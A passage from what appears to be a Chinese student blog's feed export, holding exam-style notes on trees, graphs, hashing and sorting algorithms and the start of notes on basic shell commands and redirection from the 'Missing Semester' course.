title="满二叉树"></a>满二叉树</h5><p><strong>定义</strong><br>一颗深度为k且有2^k-1个结点的二叉树.<br><strong>特点</strong><br>1.每层都是满的<br>2.只有度为0和2的节点<br>3.含n个结点的满二叉树高度为log2(n+1)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094617607.png" alt="image-20231227094617607"></p><h5 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h5><p><strong>定义</strong><br>深度为k具有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树编号为1-n的结点一一对应.<br><strong>特点</strong><br>1.叶子结点只可能出现在最下面两层中<br>2.最下一层叶子结点都依次排列在该层最左边的位置上<br>3.若有度为1的结点只可能有1个且该结点只有左孩子无右孩子<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227184713123.png" alt="image-20231227184713123"></p><h5 id="非完全二叉树"><a href="#非完全二叉树" class="headerlink" title="非完全二叉树"></a>非完全二叉树</h5><p>  <img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227185531440.png" alt="image-20231227185531440"></p><h5 id="常用公式"><a href="#常用公式" class="headerlink" title="常用公式"></a>常用公式</h5><p>$$<br>叶子结点的数量（n0） &#x3D; 度为2的结点（n2）+1<br>$$</p><p>$$<br>n(总节点) &#x3D; n0（叶子节点）+n1（度为1的节点）+n2（同前） &#x3D; 2n2+n1+1<br>n0 &#x3D; n2+1<br>$$</p><h4 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h4><p>先序遍历：根左右<br>中序遍历：左根右<br>后序遍历：左右根</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227194941329.png" alt="image-20231227194941329"></p><p>先序遍历第一个为根节点<br>后序遍历最后一个是根节点<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227200402845.png" alt="image-20231227200402845"></p><h4 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h4><h5 id="前序线索二叉树"><a href="#前序线索二叉树" class="headerlink" title="前序线索二叉树"></a>前序线索二叉树</h5><p>缺少左孩子画出前驱 缺少右孩子画出后继</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228095808924.png" alt="image-20231228095808924"></p><h5 id="中序线索二叉树"><a href="#中序线索二叉树" class="headerlink" title="中序线索二叉树"></a>中序线索二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100248464.png" alt="image-20231228100248464"></p><h5 id="后序线索二叉树"><a href="#后序线索二叉树" class="headerlink" title="后序线索二叉树"></a>后序线索二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100404375.png" alt="image-20231228100404375"></p><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><h5 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h5><p>根结点无父亲 故为-1<br>F的父节点是C C的下标是3</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228104447870.png" alt="image-20231228104447870"></p><h5 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h5><p>链式进行存储 查找速度很快</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110149679.png" alt="image-20231228110149679"></p><h5 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h5><p>兄弟兄弟往下存<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110943965.png" alt="image-20231228110943965"></p><h4 id="森林、树和二叉树之间的转换"><a href="#森林、树和二叉树之间的转换" class="headerlink" title="森林、树和二叉树之间的转换"></a>森林、树和二叉树之间的转换</h4><h5 id="树转换为二叉树"><a href="#树转换为二叉树" class="headerlink" title="树转换为二叉树"></a>树转换为二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104015443.png" alt="image-20240104104015443"></p><h5 id="二叉树转换为树"><a href="#二叉树转换为树" class="headerlink" title="二叉树转换为树"></a>二叉树转换为树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104150920.png" alt="image-20240104104150920"></p><h5 id="森林转换为二叉树"><a href="#森林转换为二叉树" class="headerlink" title="森林转换为二叉树"></a>森林转换为二叉树<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240104104351221.png" alt="image-20240104104351221"></h5><h5 id="二叉树转换为森林"><a href="#二叉树转换为森林" class="headerlink" title="二叉树转换为森林"></a>二叉树转换为森林</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104105859199.png" alt="image-20240104105859199"></p><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><p>Q：构造19, 21,2,3,6，7, 10，32的哈夫曼树,并计算WPL〔带权路径长度）的值。</p><p>Step:<br>1.选择两个最小结点<br>2.用计算结点替代原两结点<br>3.比较运算结果 循环上述步骤</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110509254.png" alt="image-20240104110509254"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPL计算：结点值*层数</span><br></pre></td></tr></table></figure><h4 id="图的定义和术语"><a href="#图的定义和术语" class="headerlink" title="图的定义和术语"></a>图的定义和术语</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110926157.png" alt="image-20240104110926157"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110956343.png" alt="image-20240104110956343"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111004803.png" alt="image-20240104111004803"></p><h4 id="邻接矩阵（图的一种存储结构）"><a href="#邻接矩阵（图的一种存储结构）" class="headerlink" title="邻接矩阵（图的一种存储结构）"></a>邻接矩阵（图的一种存储结构）</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连通写1 不连通写0</span><br></pre></td></tr></table></figure><h5 id="无向图的邻接矩阵"><a href="#无向图的邻接矩阵" class="headerlink" title="无向图的邻接矩阵"></a>无向图的邻接矩阵</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111642007.png" alt="image-20240104111642007"><strong>特点</strong>：前半部分和后半部分对称</p><h5 id="有向图的邻接矩阵"><a href="#有向图的邻接矩阵" class="headerlink" title="有向图的邻接矩阵"></a>有向图的邻接矩阵</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111933916.png" alt="image-20240104111933916"></p><p><strong>特点</strong>：不对称 出度按行求和 入度按列求和 </p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">总度数</span>=<span class="string">出度+入度</span></span><br></pre></td></tr></table></figure><h5 id="有权图的邻接矩阵"><a href="#有权图的邻接矩阵" class="headerlink" title="有权图的邻接矩阵"></a>有权图的邻接矩阵</h5><p>**两个结点无连接填无穷大 **</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112102780.png" alt="image-20240104112102780"></p><h4 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h4><h5 id="邻接矩阵存在的缺点："><a href="#邻接矩阵存在的缺点：" class="headerlink" title="邻接矩阵存在的缺点："></a>邻接矩阵存在的缺点：</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112151351.png" alt="image-20240104112151351"></p><h5 id="无向图的邻接表"><a href="#无向图的邻接表" class="headerlink" title="无向图的邻接表"></a>无向图的邻接表</h5><p><strong>画出顶点域和边表头指针域</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112425169.png" alt="image-20240104112425169"><strong>表头指针域无指向的时候用反斜杠</strong></p><h5 id="有向图的邻接表"><a href="#有向图的邻接表" class="headerlink" title="有向图的邻接表"></a>有向图的邻接表</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112519850.png" alt="image-20240104112519850"></p><h4 id="十字链表画法"><a href="#十字链表画法" class="headerlink" title="十字链表画法"></a>十字链表画法</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112901484.png" alt="image-20240104112901484"></p><h5 id="1-写出结点域"><a href="#1-写出结点域" class="headerlink" title="1.写出结点域"></a>1.写出结点域</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112738435.png" alt="image-20240104112738435"></p><h5 id="2-开画"><a href="#2-开画" class="headerlink" title="2.开画"></a>2.开画</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112914603.png" alt="image-20240104112914603"></p><h5 id="3-找出结点域序号对应的空格进行连接指向-结束符"><a href="#3-找出结点域序号对应的空格进行连接指向-结束符" class="headerlink" title="3.找出结点域序号对应的空格进行连接指向+结束符"></a>3.找出结点域序号对应的空格进行连接指向+结束符</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104113056715.png" alt="image-20240104113056715"></p><h5 id="4-按照弧度顺序画图"><a href="#4-按照弧度顺序画图" class="headerlink" title="4.按照弧度顺序画图"></a>4.按照弧度顺序画图</h5><p>0，1，2，3</p><h4 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h4><p><strong>层层求解</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182328110.png" alt="image-20240104182328110"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182317826.png" alt="image-20240104182317826"></p><h4 id="图的深度优先遍历"><a href="#图的深度优先遍历" class="headerlink" title="图的深度优先遍历"></a>图的深度优先遍历</h4><h5 id="悬崖勒马"><a href="#悬崖勒马" class="headerlink" title="悬崖勒马"></a>悬崖勒马</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154907188.png" alt="image-20240108154907188"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154928796.png" alt="image-20240108154928796"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154949965.png" alt="image-20240108154949965"></p><h4 id="Prim算法（求解最小生成树"><a href="#Prim算法（求解最小生成树" class="headerlink" title="Prim算法（求解最小生成树)"></a>Prim算法（求解最小生成树)</h4><p>1.从结点出发，优先选择权值较小的边<br>2.再选择与所选顶点中权值最小的边<br>3.直到连接所有顶点<br><strong>注意</strong>：连接过程中不能出现环<br>如图：<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108162751161.png" alt="image-20240108162751161"></p><h4 id="Kruskal算法（最小生成树）"><a href="#Kruskal算法（最小生成树）" class="headerlink" title="Kruskal算法（最小生成树）"></a>Kruskal算法（最小生成树）</h4><p>1.找出最小边<br>2.判断是否有环<br>3.直到连接所有顶点</p><h4 id="最短路径-Dijkstra算法"><a href="#最短路径-Dijkstra算法" class="headerlink" title="最短路径-Dijkstra算法"></a>最短路径-Dijkstra算法</h4><p>T：可以确定到达<br>F：无法确定到达<br>dis:距离<br>无法直接到达填无穷大<br>换点求值的dis若小于原dis需更新将其更新为dis</p><p>从1点出发到达每个结点的最短路径<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108164053120.png" alt="image-20240108164053120"></p><h4 id="最短路径-Floyd算法"><a href="#最短路径-Floyd算法" class="headerlink" title="最短路径-Floyd算法"></a>最短路径-Floyd算法</h4><p>行：起始点<br>列</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108165520716.png" alt="image-20240108165520716"></p><p>去掉出发点结束点以及斜对角（即所求点所在的行和列行列）<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108170055738.png" alt="image-20240108170055738"></p><h4 id="拓扑排序和逆拓扑排序"><a href="#拓扑排序和逆拓扑排序" class="headerlink" title="拓扑排序和逆拓扑排序"></a>拓扑排序和逆拓扑排序</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108171446237.png" alt="image-20240108171446237"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172207326.png" alt="image-20240108172207326"></p><h4 id="AOE网中的关键路径"><a href="#AOE网中的关键路径" class="headerlink" title="AOE网中的关键路径"></a>AOE网中的关键路径</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172733812.png" alt="image-20240108172733812"></p><p>最迟发生时间从v6开始计算 事件发生的最早时间-对应权值<br>关键路径：最早时间和最迟时间相等的点<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172908486.png" alt="image-20240108172908486"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108173114691.png" alt="image-20240108173114691"></p><h4 id="平均查找长度-折半查找"><a href="#平均查找长度-折半查找" class="headerlink" title="平均查找长度-折半查找"></a>平均查找长度-折半查找</h4><p>Step：1.选值画树<br>           2.算数</p><p>先找根节点（向下取整） 再依次找出左右孩子（均值且向下取整）</p><p>查找成功的补上所缺的孩子 叶子节点补上左右孩子</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205655509.png" alt="image-20240108205655509"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每一层的层数*对应节点数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205835058.png" alt="image-20240108205835058"></p><p><strong>注意：</strong>查找失败的叶子节点计算层数往上抬一层（即减少一层）</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210009654.png" alt="image-20240108210009654"></p><h4 id="平均查找长度-分块查找"><a href="#平均查找长度-分块查找" class="headerlink" title="平均查找长度-分块查找"></a>平均查找长度-分块查找</h4><p>分块：块内无序，块间有序</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210133747.png" alt="image-20240108210133747"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211235371.png" alt="image-20240108211235371"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240108211515589.png" alt="image-20240108211515589"></p><h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><p>1.平衡二叉树左子树和右子树高度之差不超过1<br>2.以不平衡二叉树的根节点开始，沿着加入的结点方向与之相邻的三个结点进行调整</p><p><strong>大于-&gt;右孩子 小于-&gt;左孩子</strong><br>48为根节点 左孩子的度数为0 右孩子的度数为2 需调整<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211940132.png" alt="image-20240108211940132"></p><p>找到与根节点（包含根节点）相邻的三个结点找到中间值 进行左右孩子调整后移到原来位置【特别注意单长分支】<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212015309.png" alt="image-20240108212015309"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212157146.png" alt="image-20240108212157146"></p><p>记得左边孩子也要调整<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212247659.png" alt="image-20240108212247659"></p><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><p><strong>定义</strong><br>特殊的二叉排序树，主要用它存储有序的结构，查找操作时间复杂度O（log2n）</p><p><strong>特性</strong><br>1.每个结点红色&#x2F;黑色<br>2.根节点是黑色的<br>3.叶节点（外部结点、NULL结点、失败结点）均是黑色的<br>4.不存在两个相邻的红结点（即红结点的父节点和孩子都是黑色的）每两个红色结点之间必有一个黑色结点进行间隔<br>5.对于每个结点，从该节点到任一叶结点的简单路径上，所含黑结点的数目相同</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">左根右（左孩子小于右孩子）</span><br><span class="line">根叶黑（根结点和叶结点都是黑色的）</span><br><span class="line">不红红（两个相邻的红结点之间必有一个黑结点）</span><br><span class="line">黑路通（任意结点到达叶子结点经历的黑色结点数相同）</span><br></pre></td></tr></table></figure><h4 id="B数"><a href="#B数" class="headerlink" title="B数"></a>B数</h4><p><strong>定义</strong><br>多路平衡查找树<br>B树的阶：B树中所有结点的孩子个数的最大值（m）<br>空树：m阶B树</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108213540726.png" alt="image-20240108213540726"></p><p>叶子结点实际是空指针（指向NULL）查找失败之后指向空值<br>终端结点指向实际值<br><strong>特性</strong><br>1.树的根结点至多有m颗子树，即至多含有m-1个关键字<br>2.若根节点不是终端节点，则至少有两颗子树<br>3.除根节点外的所有非叶节点</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108215954396.png" alt="image-20240108215954396"></p><p>从左到右以此增大</p><h4 id="散列表处理冲突的方法"><a href="#散列表处理冲突的方法" class="headerlink" title="散列表处理冲突的方法"></a>散列表处理冲突的方法</h4><h5 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h5><p>用散列函数进行求解 有冲突往下求解</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108220959786.png" alt="image-20240108220959786"></p><h5 id="平方探测法"><a href="#平方探测法" class="headerlink" title="平方探测法"></a>平方探测法</h5><p>首先用散列函数进行查找 有冲突用di从0的平方开始<br>顺延可以往前也可以往后<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231526514.png" alt="image-20240108231526514"></p><h5 id="双散列法"><a href="#双散列法" class="headerlink" title="双散列法"></a>双散列法</h5><p>有冲突对两个散列表长度进行相加求解取mod</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231726833.png" alt="image-20240108231726833"></p><p>i &#x3D; 冲突的次数（递增）</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108232107297.png" alt="image-20240108232107297"></p><p>4的位置已被占 此时用Hi公式 0+1*4 &#x3D; 4又回到4的位置被占用 递增i<br>i &#x3D; 2 Hi &#x3D; 0 + 4 * 2 &#x3D; 8</p><h4 id="直接插入排序算法"><a href="#直接插入排序算法" class="headerlink" title="直接插入排序算法"></a>直接插入排序算法</h4><p><strong>Step</strong><br>1.选取一个数并将其作为有序序列<br>2.每一轮排序将后面的一个数加入改序列<br>3.直到最后一个数</p><h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p><strong>Step</strong><br>1.选取一个数并将其作为有序序列<br>2.每一轮用折半查找法将后面的一个数加入到该序列<br>3.直到最后一个数</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233354754.png" alt="image-20240108233354754"></p><p>初始位空余用来排序 默认第一位是有序序列 从第二位开始 将第二位移到0位</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233419168.png" alt="image-20240108233419168"></p><p>选取数小于mid high指针前移（mid向上取整）<br>选取数大于mid low指针后移<br>low &#x3D;&#x3D;high 时结束排序</p><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p>1.间隔分组（通常为总长度的一半）<br>2.组内排序<br>3.重新设置间隔分组（为前一次分组的一半）<br>4.重新插入排序</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001556346.png" alt="image-20240109001556346"></p><p>组内排序</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001659213.png" alt="image-20240109001659213"></p><p>同样组内排序直至分为一组</p><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p><strong>step</strong><br>1.依次比较两个相邻元素<br>2.若无序就交换位置，将较大值放在后面</p><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p><strong>Step</strong><br>1.选定一个数为中心轴（通常为首位）<br>2.将小于该数字的元素放在左边<br>3.将大于该数字的元素放在右边<br>4分别为左右子序列重复前三步操作</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109002822376.png" alt="image-20240109002822376"></p><p>选中轴移到最开始位置（0）<br>从右边开始排序（high）找到比中心轴的值小开始从左比较<br>low和high重合排序结束</p><h4 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h4><p>Step<br>1.从头到尾扫描序列，找到最小元素与第一位进行交换<br>2.从剩下的无序队列中选出最小元素与第一位进行交换，以此类推<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003743729.png" alt="image-20240109003743729"></p><p>整个数组有8位经过8次交换</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003813759.png" alt="image-20240109003813759"></p><h4 id="堆排序（选择排序）"><a href="#堆排序（选择排序）" class="headerlink" title="堆排序（选择排序）"></a>堆排序（选择排序）</h4><p><strong>Step</strong><br>1.生成完全二叉树<br>2.从第一个非叶子结点：n&#x2F;2-1 开始调整（n：序列长度 ）<br>一共4层长度为8 8&#x2F;2-1 &#x3D; 3 97开始 </p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109004918159.png" alt="image-20240109004918159"></p><p>大根堆：父节点大于子结点<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105338676.png" alt="image-20240109105338676"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105414965.png" alt="image-20240109105414965"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105435445.png" alt="image-20240109105435445"></p><p>插入元素后进行调整只需对根节点到新增节点进行调整</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110347845.png" alt="image-20240109110347845"><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110420903.png" alt="image-20240109110420903">删除元素后只需将尾节点移动到首节结点的位置<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110307330.png" alt="image-20240109110307330"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110331687.png" alt="image-20240109110331687"></p><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p><strong>Step</strong><br>1.开始每个数字作为一组<br>2.每次进行前后两个数的两两比较 直到最后一组<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110533528.png" alt="image-20240109110533528"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110611575.png" alt="image-20240109110611575"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110624186.png" alt="image-20240109110624186"></p><h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><p><strong>step</strong><br>1.将数字按位分割成多个部分<br>2.根据每个部分信息将数字进行分配<br>3.将数字依次收集 组成新的排序结果</p><p>个位<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110744955.png" alt="image-20240109110744955"></p><p>十位<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110837347.png" alt="image-20240109110837347"></p><p>百位<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110858727.png" alt="image-20240109110858727"></p><h4 id="排序算法总结"><a href="#排序算法总结" class="headerlink" title="排序算法总结"></a>排序算法总结</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109111241802.png" alt="image-20240109111241802"></p><p>有两只动物，一只叫插帽龟，另一只叫统计鸡，它两做事情都很稳，其中插帽龟喜欢插帽子，统计鸡喜欢做统计（加减乘除）。<br>但有一天，插帽龟在选择帽子时候，掉了帽子就慌（方 n^2）了，还好被恩人（nlog）捡到快速归还给对方(堆).</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Missing Semester of Your CS Education</title>
      <link href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/"/>
      <url>/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/</url>
      
        <content type="html"><![CDATA[<h2 id="The-Missing-Semester-of-Your-CS-Education"><a href="#The-Missing-Semester-of-Your-CS-Education" class="headerlink" title="The Missing Semester of Your CS Education"></a>The Missing Semester of Your CS Education</h2><h3 id="First-Course-Overview-The-Shell"><a href="#First-Course-Overview-The-Shell" class="headerlink" title="First   Course Overview The Shell"></a>First   Course Overview The Shell</h3><h2 id="命令行语句"><a href="#命令行语句" class="headerlink" title="命令行语句"></a>命令行语句</h2><table><thead><tr><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">pwd(process[print] working directory)</td><td>输出当前位置</td></tr><tr><td align="left">cd .</td><td>到当前目录</td></tr><tr><td align="left">cd ..</td><td>上一级目录</td></tr><tr><td align="left">cd &#x2F;cd ~</td><td>回到根目录</td></tr><tr><td align="left">cd -</td><td>回到跳转前的目录（可在两个目录之间切换）</td></tr><tr><td align="left">ls -l</td><td>列出当前目录下子文件的详细信息</td></tr><tr><td align="left">ls -a</td><td>列出所有文件包含隐藏文件</td></tr><tr><td align="left">* ?</td><td>代替一个字符串 一个字符</td></tr><tr><td align="left">mv A B</td><td>重命名并可以移动文件</td></tr><tr><td align="left">cp A B</td><td>复制并可以移动文件</td></tr><tr><td align="left">control L</td><td>清除终端</td></tr><tr><td align="left">cat</td><td>打印文件内容到终端上</td></tr><tr><td align="left">touch</td><td>建立新文件</td></tr><tr><td align="left">&gt;&gt;</td><td>不覆盖而是叠加</td></tr><tr><td align="left">A | B</td><td>A的输出作为B的输入</td></tr><tr><td align="left">grep A B</td><td>在A里查找B</td></tr><tr><td align="left">man,rm,mkdir,rmdir</td><td></td></tr><tr><td align="left">&gt; &#x2F;</td><td>覆盖</td></tr></tbody></table><p>rm用于无递归删除 -r 递归删除  rmdir仅允许删除空目录</p><p>mkdir 创建目录</p><h3 id="关于重定向和-cat"><a href="#关于重定向和-cat" class="headerlink" title="关于重定向和 cat"></a><strong>关于重定向和 cat</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello &gt; hello.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt &gt; hello2.txt<span class="comment">#将txt内容复制到2.txt中</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello2.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;hello.txt &gt;&gt; hello2.txt</span></span><br><span class="line">hello</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>本以为 <code>cat &lt; hello.txt</code> 会报错 <code>cat: hello: No such file or directory</code>。猜想正确工作的原因是“参数”和“输入”的区别（未经验证或查找资料）：cat 程序将输入打印在屏幕上，<code>cat hello.txt</code> 中的 <code>hello.txt</code> 是参数，将该文件的内容作为输入；而 <code>cat &lt; hello.txt</code> 是输入重定向，意思也是将文件中的内容作为程序的输入，而不是将文件的内容作为参数，因此二者效果相同。</p><h3 id="tee-的小用处"><a href="#tee-的小用处" class="headerlink" title="tee 的小用处"></a><strong>tee 的小用处</strong></h3><p>接受输入并将其写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 500 &gt; brightness(sudo su后) == ehco 500 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd /sys/<span class="keyword">class</span>/<span class="symbol">backlight</span>/<span class="symbol">thinkpad_screen</span></span><br><span class="line">$ <span class="symbol">sudo</span> <span class="symbol">echo</span> <span class="symbol">3</span> &gt; <span class="symbol">brightness</span></span><br><span class="line"><span class="symbol">An</span> <span class="symbol">error</span> <span class="symbol">occurred</span> <span class="symbol">while</span> <span class="symbol">redirecting</span> <span class="symbol">file</span> &#x27;<span class="symbol">brightness</span>&#x27;</span><br><span class="line"><span class="symbol">open: <span class="symbol">Permission</span></span> <span class="symbol">denied</span></span><br></pre></td></tr></table></figure><p>出乎意料的是，我们还是得到了一个错误信息。毕竟，我们已经使用了 <code>sudo</code> 命令！关于 shell，有件事我们必须要知道。<code>|</code>、<code>&gt;</code>、和 <code>&lt;</code> 是通过 shell 执行的，而不是被各个程序单独执行。 <code>echo</code> 等程序并不知道 <code>|</code> 